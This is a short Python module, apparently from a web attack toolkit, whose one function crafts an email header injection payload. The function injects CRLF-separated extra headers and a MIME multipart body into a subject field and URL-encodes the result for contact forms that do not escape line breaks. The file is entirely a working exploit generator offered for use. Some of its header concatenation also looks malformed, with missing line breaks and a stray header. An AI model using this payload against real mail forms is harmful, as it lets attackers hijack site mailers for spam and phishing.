import requests
import re
import datetime

from ..common import urlencode1

__all__ = [
    "email_subject_payload",
]


def email_subject_payload(subject, added_headers, msg_body):
    """Crafts payload for email header exploitation

    Email header vulnerability appears when contact form
    or emailing functionality passes input from user to
    mail function and lets characters \\r\\n unescaped:

    http://securephpwiki.com/index.php/Email_Injection
    """

    nl = "\r\n"
    pload = (subject + nl +
             nl.join([("%s: %s" % (k, v)) for k, v in added_headers.items()]) +
             "MIME-Version: 1.0" + nl +
             'Content-Type: multipart/mixed; boundary="MyBoundary";'
             "Content-Transfer-Encoding: 7bit" + nl +
             "X-IS-VARYBY: pricepromotion" + nl +
             "--MyBoundary" + nl +
             "Content-Type: text/html;charset=UTF-8" + nl + nl +
             msg_body +
             nl + nl + "--MyBoundary--" + nl + nl + "AAAABBBBB"
             )

    return urlencode1(pload)
